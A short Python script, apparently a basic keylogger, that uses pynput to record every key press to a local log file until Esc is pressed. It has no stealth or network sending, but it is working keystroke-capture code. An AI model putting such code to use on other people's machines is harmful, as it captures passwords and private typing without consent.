from pynput.keyboard import Listener, Key


def write_to_file(key):

    if key == Key.esc:
        return False

    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open(r"D:\Proj\log.txt", 'a') as f:
        f.write(letter)

open(r"D:\Proj\log.txt", "w").close()
with Listener(on_press=write_to_file) as l:
    l.join()